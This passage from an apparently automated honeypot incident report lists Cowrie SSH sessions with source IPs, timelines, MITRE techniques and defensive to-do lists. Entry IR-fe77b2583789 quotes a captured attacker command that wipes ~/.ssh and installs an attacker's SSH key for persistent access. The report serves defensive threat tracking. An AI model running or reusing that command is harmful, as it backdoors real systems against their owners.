| `2026-07-02 13:00:11` | `cowrie.command.input` |
| `2026-07-02 13:00:11` | `cowrie.command.failed` |
| `2026-07-02 13:00:12` | `cowrie.command.input` |
| `2026-07-02 13:00:12` | `cowrie.command.failed` |
| `2026-07-02 13:00:12` | `cowrie.command.input` |
| `2026-07-02 13:00:12` | `cowrie.command.input` |
| `2026-07-02 13:00:12` | `cowrie.command.failed` |
| `2026-07-02 13:00:12` | `cowrie.command.failed` |
| `2026-07-02 13:00:43` | `cowrie.log.closed` |
| `2026-07-02 13:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0675732da53f

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:00 |
| **Last Seen** | 2026-07-02 13:01 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:00:43` | `cowrie.session.connect` |
| `2026-07-02 13:00:44` | `cowrie.login.success` |
| `2026-07-02 13:00:44` | `cowrie.session.params` |
| `2026-07-02 13:00:45` | `cowrie.command.input` |
| `2026-07-02 13:00:45` | `cowrie.command.failed` |
| `2026-07-02 13:00:45` | `cowrie.command.input` |
| `2026-07-02 13:00:45` | `cowrie.command.failed` |
| `2026-07-02 13:00:45` | `cowrie.command.input` |
| `2026-07-02 13:00:45` | `cowrie.command.failed` |
| `2026-07-02 13:00:46` | `cowrie.command.input` |
| `2026-07-02 13:00:46` | `cowrie.command.failed` |
| `2026-07-02 13:00:46` | `cowrie.command.input` |
| `2026-07-02 13:00:46` | `cowrie.command.input` |
| `2026-07-02 13:00:46` | `cowrie.command.failed` |
| `2026-07-02 13:00:46` | `cowrie.command.failed` |
| `2026-07-02 13:01:17` | `cowrie.log.closed` |
| `2026-07-02 13:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac4958fbb5b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 13:00 |
| **Last Seen** | 2026-07-02 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:00:44` | `cowrie.session.connect` |
| `2026-07-02 13:00:44` | `cowrie.client.version` |
| `2026-07-02 13:00:44` | `cowrie.client.kex` |
| `2026-07-02 13:00:45` | `cowrie.login.success` |
| `2026-07-02 13:00:45` | `cowrie.session.params` |
| `2026-07-02 13:00:45` | `cowrie.command.input` |
| `2026-07-02 13:00:46` | `cowrie.log.closed` |
| `2026-07-02 13:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def3cb21d7e6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 13:01 |
| **Last Seen** | 2026-07-02 13:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:01:04` | `cowrie.session.connect` |
| `2026-07-02 13:01:05` | `cowrie.client.version` |
| `2026-07-02 13:01:05` | `cowrie.client.kex` |
| `2026-07-02 13:01:11` | `cowrie.login.success` |
| `2026-07-02 13:01:13` | `cowrie.session.params` |
| `2026-07-02 13:01:13` | `cowrie.command.input` |
| `2026-07-02 13:01:15` | `cowrie.log.closed` |
| `2026-07-02 13:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b01646d2c73

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:01 |
| **Last Seen** | 2026-07-02 13:01 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:01:17` | `cowrie.session.connect` |
| `2026-07-02 13:01:18` | `cowrie.login.success` |
| `2026-07-02 13:01:18` | `cowrie.session.params` |
| `2026-07-02 13:01:19` | `cowrie.command.input` |
| `2026-07-02 13:01:19` | `cowrie.command.failed` |
| `2026-07-02 13:01:19` | `cowrie.command.input` |
| `2026-07-02 13:01:19` | `cowrie.command.failed` |
| `2026-07-02 13:01:19` | `cowrie.command.input` |
| `2026-07-02 13:01:19` | `cowrie.command.failed` |
| `2026-07-02 13:01:20` | `cowrie.command.input` |
| `2026-07-02 13:01:20` | `cowrie.command.failed` |
| `2026-07-02 13:01:20` | `cowrie.command.input` |
| `2026-07-02 13:01:20` | `cowrie.command.input` |
| `2026-07-02 13:01:20` | `cowrie.command.failed` |
| `2026-07-02 13:01:20` | `cowrie.command.failed` |
| `2026-07-02 13:01:51` | `cowrie.log.closed` |
| `2026-07-02 13:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6020f80c24f

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:01 |
| **Last Seen** | 2026-07-02 13:02 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:01:51` | `cowrie.session.connect` |
| `2026-07-02 13:01:52` | `cowrie.login.success` |
| `2026-07-02 13:01:52` | `cowrie.session.params` |
| `2026-07-02 13:01:53` | `cowrie.command.input` |
| `2026-07-02 13:01:53` | `cowrie.command.failed` |
| `2026-07-02 13:01:53` | `cowrie.command.input` |
| `2026-07-02 13:01:53` | `cowrie.command.failed` |
| `2026-07-02 13:01:53` | `cowrie.command.input` |
| `2026-07-02 13:01:53` | `cowrie.command.failed` |
| `2026-07-02 13:01:54` | `cowrie.command.input` |
| `2026-07-02 13:01:54` | `cowrie.command.failed` |
| `2026-07-02 13:01:54` | `cowrie.command.input` |
| `2026-07-02 13:01:54` | `cowrie.command.input` |
| `2026-07-02 13:01:54` | `cowrie.command.failed` |
| `2026-07-02 13:01:54` | `cowrie.command.failed` |
| `2026-07-02 13:02:25` | `cowrie.log.closed` |
| `2026-07-02 13:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efeaa47b765a

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:02 |
| **Last Seen** | 2026-07-02 13:02 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:02:25` | `cowrie.session.connect` |
| `2026-07-02 13:02:26` | `cowrie.login.success` |
| `2026-07-02 13:02:26` | `cowrie.session.params` |
| `2026-07-02 13:02:27` | `cowrie.command.input` |
| `2026-07-02 13:02:27` | `cowrie.command.failed` |
| `2026-07-02 13:02:27` | `cowrie.command.input` |
| `2026-07-02 13:02:27` | `cowrie.command.failed` |
| `2026-07-02 13:02:28` | `cowrie.command.input` |
| `2026-07-02 13:02:28` | `cowrie.command.failed` |
| `2026-07-02 13:02:28` | `cowrie.command.input` |
| `2026-07-02 13:02:28` | `cowrie.command.failed` |
| `2026-07-02 13:02:28` | `cowrie.command.input` |
| `2026-07-02 13:02:28` | `cowrie.command.input` |
| `2026-07-02 13:02:28` | `cowrie.command.failed` |
| `2026-07-02 13:02:28` | `cowrie.command.failed` |
| `2026-07-02 13:02:59` | `cowrie.log.closed` |
| `2026-07-02 13:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef665471293b

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:02 |
| **Last Seen** | 2026-07-02 13:03 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:02:59` | `cowrie.session.connect` |
| `2026-07-02 13:03:00` | `cowrie.login.success` |
| `2026-07-02 13:03:01` | `cowrie.login.success` |
| `2026-07-02 13:03:01` | `cowrie.session.params` |
| `2026-07-02 13:03:02` | `cowrie.command.input` |
| `2026-07-02 13:03:02` | `cowrie.command.failed` |
| `2026-07-02 13:03:02` | `cowrie.command.input` |
| `2026-07-02 13:03:02` | `cowrie.command.failed` |
| `2026-07-02 13:03:02` | `cowrie.command.input` |
| `2026-07-02 13:03:02` | `cowrie.command.input` |
| `2026-07-02 13:03:02` | `cowrie.command.failed` |
| `2026-07-02 13:03:02` | `cowrie.command.failed` |
| `2026-07-02 13:03:33` | `cowrie.log.closed` |
| `2026-07-02 13:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ded1d5b4d3f6

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:03 |
| **Last Seen** | 2026-07-02 13:04 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:03:33` | `cowrie.session.connect` |
| `2026-07-02 13:03:34` | `cowrie.login.success` |
| `2026-07-02 13:03:34` | `cowrie.session.params` |
| `2026-07-02 13:03:35` | `cowrie.command.input` |
| `2026-07-02 13:03:35` | `cowrie.command.failed` |
| `2026-07-02 13:03:35` | `cowrie.command.input` |
| `2026-07-02 13:03:35` | `cowrie.command.failed` |
| `2026-07-02 13:03:35` | `cowrie.command.input` |
| `2026-07-02 13:03:35` | `cowrie.command.failed` |
| `2026-07-02 13:03:36` | `cowrie.command.input` |
| `2026-07-02 13:03:36` | `cowrie.command.failed` |
| `2026-07-02 13:03:36` | `cowrie.command.input` |
| `2026-07-02 13:03:36` | `cowrie.command.input` |
| `2026-07-02 13:03:36` | `cowrie.command.failed` |
| `2026-07-02 13:03:36` | `cowrie.command.failed` |
| `2026-07-02 13:04:07` | `cowrie.log.closed` |
| `2026-07-02 13:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1501f7ca58ae

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 13:08 |
| **Last Seen** | 2026-07-02 13:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:08:18` | `cowrie.session.connect` |
| `2026-07-02 13:08:19` | `cowrie.client.version` |
| `2026-07-02 13:08:19` | `cowrie.client.kex` |
| `2026-07-02 13:08:21` | `cowrie.login.success` |
| `2026-07-02 13:08:22` | `cowrie.session.params` |
| `2026-07-02 13:08:22` | `cowrie.command.input` |
| `2026-07-02 13:08:23` | `cowrie.log.closed` |
| `2026-07-02 13:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d30eb41224b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 13:11 |
| **Last Seen** | 2026-07-02 13:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:11:00` | `cowrie.session.connect` |
| `2026-07-02 13:11:00` | `cowrie.client.version` |
| `2026-07-02 13:11:00` | `cowrie.client.kex` |
| `2026-07-02 13:11:00` | `cowrie.login.success` |
| `2026-07-02 13:11:02` | `cowrie.session.params` |
| `2026-07-02 13:11:02` | `cowrie.command.input` |
| `2026-07-02 13:11:02` | `cowrie.log.closed` |
| `2026-07-02 13:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a82b15defc1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 13:11 |
| **Last Seen** | 2026-07-02 13:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:11:52` | `cowrie.session.connect` |
| `2026-07-02 13:11:53` | `cowrie.client.version` |
| `2026-07-02 13:11:53` | `cowrie.client.kex` |
| `2026-07-02 13:11:58` | `cowrie.login.success` |
| `2026-07-02 13:12:02` | `cowrie.session.params` |
| `2026-07-02 13:12:02` | `cowrie.command.input` |
| `2026-07-02 13:12:03` | `cowrie.log.closed` |
| `2026-07-02 13:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a4e9a92e70

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 13:22 |
| **Last Seen** | 2026-07-02 13:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:22:23` | `cowrie.session.connect` |
| `2026-07-02 13:22:23` | `cowrie.client.version` |
| `2026-07-02 13:22:23` | `cowrie.client.kex` |
| `2026-07-02 13:22:25` | `cowrie.login.success` |
| `2026-07-02 13:22:26` | `cowrie.session.params` |
| `2026-07-02 13:22:26` | `cowrie.command.input` |
| `2026-07-02 13:22:26` | `cowrie.log.closed` |
| `2026-07-02 13:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f20f155f4f0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 13:22 |
| **Last Seen** | 2026-07-02 13:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:22:52` | `cowrie.session.connect` |
| `2026-07-02 13:22:54` | `cowrie.client.version` |
| `2026-07-02 13:22:54` | `cowrie.client.kex` |
| `2026-07-02 13:22:59` | `cowrie.login.success` |
| `2026-07-02 13:23:03` | `cowrie.session.params` |
| `2026-07-02 13:23:03` | `cowrie.command.input` |
| `2026-07-02 13:23:04` | `cowrie.log.closed` |
| `2026-07-02 13:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acfdc75a198c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 13:24 |
| **Last Seen** | 2026-07-02 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:24:14` | `cowrie.session.connect` |
| `2026-07-02 13:24:14` | `cowrie.client.version` |
| `2026-07-02 13:24:14` | `cowrie.client.kex` |
| `2026-07-02 13:24:14` | `cowrie.login.success` |
| `2026-07-02 13:24:15` | `cowrie.session.params` |
| `2026-07-02 13:24:15` | `cowrie.command.input` |
| `2026-07-02 13:24:15` | `cowrie.log.closed` |
| `2026-07-02 13:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2010477e35ff

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 13:34 |
| **Last Seen** | 2026-07-02 13:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:34:12` | `cowrie.session.connect` |
| `2026-07-02 13:34:13` | `cowrie.client.version` |
| `2026-07-02 13:34:13` | `cowrie.client.kex` |
| `2026-07-02 13:34:20` | `cowrie.login.success` |
| `2026-07-02 13:34:23` | `cowrie.session.params` |
| `2026-07-02 13:34:23` | `cowrie.command.input` |
| `2026-07-02 13:34:25` | `cowrie.log.closed` |
| `2026-07-02 13:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ea0b1c22dd

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 13:36 |
| **Last Seen** | 2026-07-02 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:36:33` | `cowrie.session.connect` |
| `2026-07-02 13:36:34` | `cowrie.client.version` |
| `2026-07-02 13:36:34` | `cowrie.client.kex` |
| `2026-07-02 13:36:35` | `cowrie.login.success` |
| `2026-07-02 13:36:37` | `cowrie.session.params` |
| `2026-07-02 13:36:37` | `cowrie.command.input` |
| `2026-07-02 13:36:37` | `cowrie.log.closed` |
| `2026-07-02 13:36:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c88abb05bff0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 13:40 |
| **Last Seen** | 2026-07-02 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:40:23` | `cowrie.session.connect` |
| `2026-07-02 13:40:23` | `cowrie.client.version` |
| `2026-07-02 13:40:23` | `cowrie.client.kex` |
| `2026-07-02 13:40:24` | `cowrie.login.success` |
| `2026-07-02 13:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a6245d1878c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 13:40 |
| **Last Seen** | 2026-07-02 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:40:24` | `cowrie.session.connect` |
| `2026-07-02 13:40:24` | `cowrie.client.version` |
| `2026-07-02 13:40:24` | `cowrie.client.kex` |
| `2026-07-02 13:40:25` | `cowrie.login.success` |
| `2026-07-02 13:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe77b2583789

| Field | Detail |
|---|---|
| **Source IP** | `83.168.107[.]158` |
| **First Seen** | 2026-07-02 13:43 |
| **Last Seen** | 2026-07-02 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:43:16` | `cowrie.session.connect` |
| `2026-07-02 13:43:16` | `cowrie.client.version` |
| `2026-07-02 13:43:16` | `cowrie.client.kex` |
| `2026-07-02 13:43:17` | `cowrie.login.success` |
| `2026-07-02 13:43:17` | `cowrie.session.params` |
| `2026-07-02 13:43:17` | `cowrie.command.input` |
| `2026-07-02 13:43:17` | `cowrie.command.failed` |
| `2026-07-02 13:43:18` | `cowrie.log.closed` |
| `2026-07-02 13:43:18` | `cowrie.session.params` |
| `2026-07-02 13:43:18` | `cowrie.command.input` |
| `2026-07-02 13:43:19` | `cowrie.session.file_download` |
| `2026-07-02 13:43:19` | `cowrie.log.closed` |
| `2026-07-02 13:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.107[.]158` to AbuseIPDB if not already reported
- [ ] Block `83.168.107[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a8a9341232

| Field | Detail |
|---|---|
| **Source IP** | `83.168.107[.]158` |
| **First Seen** | 2026-07-02 13:43 |
| **Last Seen** | 2026-07-02 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:43:19` | `cowrie.session.connect` |
| `2026-07-02 13:43:19` | `cowrie.client.version` |
| `2026-07-02 13:43:19` | `cowrie.client.kex` |
| `2026-07-02 13:43:19` | `cowrie.login.success` |
| `2026-07-02 13:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.107[.]158` to AbuseIPDB if not already reported
- [ ] Block `83.168.107[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe7adf44c1b

| Field | Detail |
|---|---|
| **Source IP** | `83.168.107[.]158` |
| **First Seen** | 2026-07-02 13:43 |
| **Last Seen** | 2026-07-02 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:43:20` | `cowrie.session.connect` |
| `2026-07-02 13:43:20` | `cowrie.client.version` |
| `2026-07-02 13:43:20` | `cowrie.client.kex` |
| `2026-07-02 13:43:20` | `cowrie.login.success` |
| `2026-07-02 13:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.107[.]158` to AbuseIPDB if not already reported
- [ ] Block `83.168.107[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872738ed1ce4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 13:45 |
| **Last Seen** | 2026-07-02 13:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:45:25` | `cowrie.session.connect` |
| `2026-07-02 13:45:27` | `cowrie.client.version` |
| `2026-07-02 13:45:27` | `cowrie.client.kex` |
| `2026-07-02 13:45:32` | `cowrie.login.success` |
| `2026-07-02 13:45:36` | `cowrie.session.params` |
| `2026-07-02 13:45:36` | `cowrie.command.input` |
| `2026-07-02 13:45:38` | `cowrie.log.closed` |
| `2026-07-02 13:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b512b7558a9d

| Field | Detail |
